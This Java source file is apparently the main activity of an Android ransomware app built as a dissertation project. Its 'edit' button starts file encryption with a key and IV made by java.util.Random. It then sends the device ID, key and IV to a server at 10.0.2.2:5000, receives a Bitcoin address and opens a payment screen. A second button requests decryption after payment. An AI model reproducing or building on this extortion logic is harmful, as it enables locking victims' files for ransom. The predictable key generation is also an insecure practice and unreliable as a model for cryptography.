package com.example.disertatie;

import static android.provider.Settings.Secure.ANDROID_ID;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.security.crypto.MasterKeys;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.MediaScannerConnection;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.security.keystore.KeyGenParameterSpec;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.GeneralSecurityException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Random;
import java.util.concurrent.ExecutionException;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import javax.crypto.Cipher;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;


public class MainActivity extends AppCompatActivity {

    public static String randomString(){
// create a string of all characters
        String alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

        // create random string builder
        StringBuilder sb = new StringBuilder();

        // create an object of Random class
        Random random = new Random();

        // specify length of random string
        int length = 16;

        for(int i = 0; i < length; i++) {

            // generate random index number
            int index = random.nextInt(alphabet.length());

            // get character specified by index
            // from the string
            char randomChar = alphabet.charAt(index);

            // append the character to string builder
            sb.append(randomChar);
        }

        String randomString = sb.toString();
        return randomString;
    }

    public AsyncEncrypt asyncEncrypt;
    public Button editButton;
    public Button myEditsButton;
    public LoadingDialog loadingDialog;

    public MainActivity() throws NoSuchPaddingException, NoSuchAlgorithmException {
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        if((ContextCompat.checkSelfPermission(getApplicationContext(),Manifest.permission.WRITE_EXTERNAL_STORAGE) != 0)) {

            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, 23);

            // SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
            // String userid = preferences.getString("userid", null);
        }
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        String generatedIV = randomString();
        String generatedKey = randomString();
        @SuppressLint("HardwareIds") String phoneID = Settings.Secure.getString(getApplicationContext()
                .getContentResolver(), ANDROID_ID);
        asyncEncrypt = new AsyncEncrypt();
        editButton = findViewById(R.id.editButton);
        editButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                asyncEncrypt.execute(generatedIV,generatedKey);

                AsyncRequestPOST asyncRequestPOST = new AsyncRequestPOST();

                try {
                    String BTCAddress = asyncRequestPOST.execute("http://10.0.2.2:5000/add", phoneID, generatedIV,generatedKey).get();
                    Intent intent = new Intent(MainActivity.this,PaymentActivity.class);
                    intent.putExtra("address",BTCAddress);
                    startActivity(intent);
                } catch (Exception e) {
                    e.printStackTrace();
                }

            }
        });
        myEditsButton = findViewById(R.id.myEditsButton);
        myEditsButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                AsyncRequestDEC asyncRequestDEC = new AsyncRequestDEC(getApplicationContext());
                asyncRequestDEC.execute("http://10.0.2.2:5000/checkout",phoneID);
                MediaScannerConnection.scanFile(MainActivity.this, new String[]{Environment.getExternalStorageDirectory().toString()}, null, new MediaScannerConnection.OnScanCompletedListener() {
                    public void onScanCompleted(String path, Uri uri) {
                        Log.i("ExternalStorage", "Scanned " + path + ":");
                        Log.i("ExternalStorage", "-> uri=" + uri);
                    }
                });
            }
        });
    }

    @Override
    protected void onPause() {
        MediaScannerConnection.scanFile(MainActivity.this, new String[]{Environment.getExternalStorageDirectory().toString()}, null, new MediaScannerConnection.OnScanCompletedListener() {
            public void onScanCompleted(String path, Uri uri) {
                Log.i("ExternalStorage", "Scanned " + path + ":");
                Log.i("ExternalStorage", "-> uri=" + uri);
            }
        });
        super.onPause();
    }
}